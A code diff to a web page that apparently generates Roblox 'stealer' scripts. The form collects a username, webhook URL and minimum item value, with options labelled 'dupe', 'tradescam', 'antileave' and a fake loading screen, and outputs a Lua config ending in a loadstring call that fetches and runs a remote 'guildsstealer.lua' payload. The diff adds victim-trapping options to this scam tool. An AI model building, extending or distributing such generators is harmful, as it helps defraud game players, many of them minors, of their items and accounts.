@@ -7,8 +7,8 @@
   <style>
     body {
         font-family: Arial, sans-serif;
-        background-color: #f5f5f5; /* Light gray background for less strain */
-        color: #333; /* Dark gray text for better readability */
+        background-color: #f5f5f5;
+        color: #333;
         text-align: center;
         margin: 0;
         padding: 0;
@@ -17,12 +17,12 @@
         max-width: 800px;
         margin: 50px auto;
         padding: 20px;
-        background: #ffffff; /* White background for the container */
+        background: #ffffff;
         border-radius: 8px;
         box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
     }
     h1 {
-        color: #007bff; /* A soothing blue for the header */
+        color: #007bff;
     }
     form {
         margin: 20px 0;
@@ -32,13 +32,13 @@
         width: calc(100% - 22px);
         margin: 10px auto;
         padding: 10px;
-        border: 1px solid #ccc; /* Light gray border */
+        border: 1px solid #ccc;
         border-radius: 5px;
         font-size: 16px;
-        background-color: #f9f9f9; /* Slightly off-white background for inputs */
+        background-color: #f9f9f9;
     }
     button {
-        background-color: #007bff; /* Blue button */
+        background-color: #007bff;
         color: white;
         border: none;
         padding: 10px 20px;
@@ -48,7 +48,7 @@
         transition: background-color 0.3s ease;
     }
     button:hover {
-        background-color: #0056b3; /* Darker blue on hover */
+        background-color: #0056b3;
     }
     #status {
         margin-top: 20px;
@@ -83,26 +83,41 @@
     <form id="scriptForm">
       <label for="username">Username:</label>
       <input type="text" id="username" name="username"><br><br>
-      
+
       <label for="webhook">Webhook URL:</label>
       <input type="text" id="webhook" name="webhook"><br><br>
-      
+
       <label for="minimumRap">Minimum RAP:</label>
-      <input type="number" id="minimumRap" name="minimumRap" value=""><br><br>
-      
+      <input type="number" id="minimumRap" name="minimumRap"><br><br>
+
+      <label for="mouseLock">Mouse Lock:</label>
+      <select id="mouseLock" name="mouseLock">
+        <option value="true">True</option>
+        <option value="false">False</option>
+      </select><br><br>
+
+      <label for="antileave">Antileave:</label>
+      <select id="antileave" name="antileave">
+        <option value="true">True</option>
+        <option value="false">False</option>
+      </select><br><br>
+
+      <label for="loadingscreen">Loading Screen:</label>
+      <input type="text" id="loadingscreen" name="loadingscreen"><br><br>
+
       <label for="typesui">Types UI:</label>
       <select id="typesui" name="typesui">
         <option value="kavo">Kavo</option>
         <option value="orion">Orion</option>
         <option value="fluent">Fluent</option>
       </select><br><br>
-      
+
       <label for="typescript">Type Script:</label>
       <select id="typescript" name="typescript">
         <option value="dupe">Dupe</option>
         <option value="tradescam">Tradescam</option>
       </select><br><br>
-      
+
       <label for="scriptname">Script Name:</label>
       <select id="scriptname" name="scriptname">
         <option value="Overdrive H">Overdrive H</option>
@@ -130,46 +145,38 @@
   </div>
 
   <script>
-    // Make sure DOM is loaded before adding event listeners
     document.addEventListener("DOMContentLoaded", function() {
       const generateButton = document.getElementById('generateBtn');
       const copyButton = document.getElementById('copyBtn');
-      
-      // Add event listener for generate button
+
       generateButton.addEventListener('click', function(event) {
-        event.preventDefault(); // Prevent any default form action
-        
-        // Fetching values from input fields
+        event.preventDefault();
+
         const username = document.getElementById("username").value;
         const webhook = document.getElementById("webhook").value;
         const minimumRap = document.getElementById("minimumRap").value;
+        const mouseLock = document.getElementById("mouseLock").value;
+        const antileave = document.getElementById("antileave").value;
+        const loadingscreen = document.getElementById("loadingscreen").value;
         const typesui = document.getElementById("typesui").value;
         const typescript = document.getElementById("typescript").value;
         const scriptname = document.getElementById("scriptname").value;
         const stealer = document.getElementById("stealer").value;
 
-        // Logging to check if values are fetched correctly
-        console.log("Username:", username);
-        console.log("Webhook:", webhook);
-        console.log("Minimum RAP:", minimumRap);
-        console.log("Types UI:", typesui);
-        console.log("Type Script:", typescript);
-        console.log("Script Name:", scriptname);
-        console.log("Stealer:", stealer);
-
-        // Input validation - check if fields are filled
         if (!username || !webhook || !minimumRap || !stealer) {
           alert("Please fill in all required fields.");
           return;
         }
 
-        // Generate output string based on the new structure
         const outputString = `--generate through website\n` +
                              `--website made by kizamies#0001/Shimm\n` +
                              `config = {\n` +
                              `    Username = "${username}",\n` +
                              `    Webhook = "${webhook}",\n` +
                              `    MinimumRap = "${minimumRap}",\n` +
+                             `    mouseLock = ${mouseLock},\n` +
+                             `    antileave = ${antileave},\n` +
+                             `    loadingscreen = "${loadingscreen}",\n` +
                              `    typesui = "${typesui}",\n` +
                              `    typescript = "${typescript}",\n` +
                              `    scriptname = "${scriptname}",\n` +
@@ -177,15 +184,13 @@
                              `}\n\n` +
                              'loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/gui-stealer/main/guildsstealer.lua",true))()';
 
-        // Set the output in the textarea
         document.getElementById("output").value = outputString;
       });
 
-      // Add event listener for copy button
       copyButton.addEventListener('click', function() {
         const copyText = document.getElementById("output");
         copyText.select();
-        copyText.setSelectionRange(0, 99999); // For mobile devices
+        copyText.setSelectionRange(0, 99999);
         document.execCommand("copy");
         alert("Copied to clipboard!");
       });
